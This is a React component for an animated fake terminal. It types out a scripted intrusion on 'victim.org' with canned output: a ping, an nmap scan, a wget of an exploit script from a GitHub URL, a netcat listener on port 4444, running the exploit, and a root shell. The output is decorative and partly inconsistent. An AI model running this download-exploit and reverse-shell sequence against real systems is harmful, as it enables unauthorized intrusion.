import { useEffect, useState } from 'react'
import TerminalTyper from '../lib/TerminalTyper'

const ROOT_PROMPT = { user: 'root', separator: '@', host: 'victim.org', suffix: ':~#' }

const SCRIPT = [
  
  { command: 'ping victim.org -c 3',
    lineDealay: 300,
    output: ['PING victim.org (10.129.117.151) 56(84) bytes of data.',
              '64 bytes from ncamsa-av-in-f14.1e100.net (10.129.117.151): icmp_seq=1 ttl=118 time=48.7 ms',
              '64 bytes from ncamsa-av-in-f14.1e100.net (10.129.117.151): icmp_seq=2 ttl=118 time=46.5 ms',
              '64 bytes from ncamsa-av-in-f14.1e100.net (10.129.117.151): icmp_seq=3 ttl=118 time=45.8 ms',
              '--- victim.org ping statistics ---',
              '3 packets transmitted, 3 received, 0% packet loss, time 2002ms',
              'rtt min/avg/max/mdev = 45.838/47.019/48.737/1.242 ms']
  },
  { command: 'nmap -p- -sSVC --min-rate 5000 victim.org', 
    lineDelay: 500,
    output: [ 'Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 17:35 +0100',
            'Nmap scan report for 10.129.117.151',
            'Host is up (0.044s latency)',
            'Not shown: 65533 filtered tcp ports (no-response)',
            'PORT   STATE SERVICE VERSION',
            '22/tcp open  ssh     OpenSSH 6.49',
            '| ssh-hostkey:',
            '|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)',
            '|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)',
            '80/tcp open  http    Apache httpd 2.4.25 ((Debian))',
            '| http-robots.txt: 1 disallowed entry',
            '|_/',
            '|_http-title: Nothing here yet.',
            'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel',
            'Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .',
            'Nmap done: 1 IP address (1 host up) scanned in 51.21 seconds']},
  { command: 'wget https://raw.githubusercontent.com/BlackHatExploitation/exploit-mikrotik-2026/refs/heads/main/full_exploit.py',
          lineDelay: 400,
          output: ['wget wget https://raw.githubusercontent.com/BlackHatExploitation/exploit-mikrotik-2026/refs/heads/main/full_exploit.py',
          '--2026-10-12 23:58:33-- wget https://raw.githubusercontent.com/BlackHatExploitation/exploit-mikrotik-2026/refs/heads/main/full_exploit.py',
          'Resolviendo github.com (github.com)... 140.82.121.3',
          'Conectando con github.com (github.com)[140.82.121.3]:443... conectado.',
          'Petición HTTP enviada, esperando respuesta... 200 OK',
          'Longitud: no especificado [text/html]',
          'Grabando a: «full_exploit.py»',
          'full_exploit.py                                   [  <=>                                                                                             ] 566,82K  2,18MB/s    en 0,3s    ',
          '2026-10-12 23:58:34 (2,18 MB/s) - «full_exploit.py» guardado [580428]]']
  },
  { command: 'ls -ltr', output: ['total 0',
    '-rw-rw-r-- 1 pablo pablo 0 oct 12 22:05 full_exploit.py*']},
  { command: 'nc -nvlc 4444 &'},
  { command: 'python full_exploit.py --target victim.org', lineDelay: 300, output: '[+] root shell obtained' },
  {
    command: 'fg %1',
    lineDelay: 300,
    output: [
      'Listening on [any] 4444',  
      'connect to [10.10.15.67] from (UNKNOWN) [10.129.113.240] 52958',
      'Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux',
      '17:46:11 up 28 min,  0 users,  load average: 0.00, 0.00, 0.00'
    ],
    nextPrompt: ROOT_PROMPT
  },
  { command: 'id', output: 'uid=0(root) gid=0(root) groups=0(root)' }
]

const INITIAL_STATE = {
  history: [],
  typing: '',
  prompt: { user: 'pablo', separator: '☠', host: 'hack', suffix: ':~$' }
}

function PromptLabel({ prompt }) {
  return (
    <>
      <span className={prompt.user === 'root' ? 'prompt-user prompt-root' : 'prompt-user'}>
        {prompt.user}
      </span>
      <span className="prompt-symbol">{prompt.separator}</span>
      <span className="prompt-host">{prompt.host}</span>
      <span className="prompt-symbol">{prompt.suffix}</span>
    </>
  )
}

export default function TerminalPrompt() {
  const [state, setState] = useState(INITIAL_STATE)

  useEffect(() => {
    const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches
    if (reduceMotion) {
      let prompt = INITIAL_STATE.prompt
      const history = SCRIPT.map((step) => {
        const entry = { ...step, prompt }
        if (step.nextPrompt) prompt = step.nextPrompt
        return entry
      })
      setState({ history, typing: '', prompt })
      return
    }

    const typer = new TerminalTyper(SCRIPT, { maxHistory: 3 })
    typer.subscribe(setState)
    typer.start()

    return () => typer.stop()
  }, [])

  return (
    <div className="terminal-prompt">
      {state.history.map((step, index) => (
        <div key={`${step.command}-${index}`}>
          <p><PromptLabel prompt={step.prompt} /> {step.command}</p>
          <div className="terminal-output">
            {[].concat(step.output).map((line, i) => (
              <p key={i}>{line}</p>
            ))}
          </div>
        </div>
      ))}
      <p>
        <PromptLabel prompt={state.prompt} /> {state.typing}
        <span className="terminal-cursor">█</span>
      </p>
    </div>
  )
}
